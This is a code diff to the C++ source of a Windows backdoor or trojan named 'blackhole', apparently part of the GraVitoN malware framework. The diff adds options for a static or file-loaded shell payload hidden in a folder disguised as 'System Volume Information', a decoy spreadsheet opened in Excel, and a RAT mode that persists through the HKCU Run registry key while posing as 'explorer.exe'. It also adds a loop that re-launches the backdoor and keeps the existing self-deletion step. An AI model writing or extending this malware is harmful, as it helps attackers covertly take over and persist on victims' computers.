@@ -26,6 +26,22 @@
 // @todo: Add modules used here to Malkit, Utils and Payload classes
 // @todo: Meterpreter Reverse HTTPS powershell payload
 
+// ============================================================================== //
+// BLACKHOLE OPTIONS
+#define DYNAMIC_SHELL   false
+#define STATIC_SHELL    "PUT YOUR SHELL HERE! ;)"
+#define DARK_PATH       "System Volume Information~"
+#define TARGET          "report.xlsx"
+#define TARGET_EXEC     "excel.exe"
+#define CMD_SHELL       "cmd.shell"
+
+// RAT MODE OPTIONS (Experimental)
+#define RAT_MODE        false
+#define RAT_STARTUP_REG "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define RAT_REG_KEY     "explorer"
+#define RAT_NAME        "explorer.exe"
+// ============================================================================== //
+
 #define INITGUID
 
 #include <windows.h>
@@ -41,6 +57,8 @@ HRESULT ResolveIt(HWND, LPCSTR, LPWSTR, int);
 
 #include <vector>
 #include <string>
+#include <fstream>
+#include <iostream>
 using namespace std;
 
 #include "blackhole.hpp"
@@ -246,7 +264,7 @@ void runTarget()
     	string tdd = search_path[c] + TARGET_EXEC;
     	GraVitoN::Utils::File exec(tdd);
     	
-    	sayshit("Using " + tdd);
+    	// sayshit("Using " + tdd);
     	
     	if(exec.exists())
     	{
@@ -256,7 +274,7 @@ void runTarget()
 		}
 		else
 		{
-			sayshit("    Not there.");
+			// sayshit("    Not there.");
 		}
 	}
 	
@@ -265,7 +283,24 @@ void runTarget()
 
 void backdoor()
 {
-	sayshit("Backdooring target system using POWERSHELL...");
+#if !DYNAMIC_SHELL
+	sayshit("Backdooring target system (STATIC SHELL)");
+	std::string path = cwd + "\\" + DARK_PATH + "\\" + CMD_SHELL;
+	blackhole_shell = STATIC_SHELL;
+#else
+	sayshit("Backdooring target system (loading " + cwd + "\\" + DARK_PATH + "\\" + CMD_SHELL + ")");
+	std::string path = cwd + "\\" + DARK_PATH + "\\" + CMD_SHELL;
+	std::ifstream fshell(path.c_str());
+	
+	if( !fshell.is_open() )
+	{
+		sayshit("Shell not found goddam it!");
+		return;
+	}
+	fshell>>blackhole_shell;
+	fshell.close();
+#endif
+	
 	sayshit("    PAYLOAD: " + blackhole_shell);
 	runOrphanProc(blackhole_shell);
 	sayshit("She's up and running!");
@@ -296,12 +331,17 @@ void suicide()
 
 bool checkRatMode()
 {
+#if RAT_MODE
 	// Check if blackhole is running on RAT mode
 	return myPath().find(rat_name) != string::npos;
+#else
+	return false;
+#endif
 }
 
 void installRat()
 {
+#if RAT_MODE
 	sayshit("Installing RAT..");
 	
 	string logfile  = " \"" + cwd + "\\" + GVN_LOG_FILE + "\"";
@@ -319,10 +359,12 @@ void installRat()
 	runOrphanProc(ratify);
 	
 	sayshit("She's up and running!");	
+#endif
 }
 
 void snitch()
 {
+#if RAT_MODE
 	// Rest for 3 minutes
 	GraVitoN::Core::sleep( 3*60*1000 );
 	
@@ -331,6 +373,7 @@ void snitch()
 		backdoor();
 		GraVitoN::Core::sleep( SHELL_TIMEOUT );
 	}
+#endif
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -371,11 +414,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		
 			huntRecentDocs();
 		}
-		
-		if( RAT_MODE )
-		{
-			installRat();
-		}
+#if RAT_MODE		
+		installRat();
+#endif
 		
 		suicide();
 	}
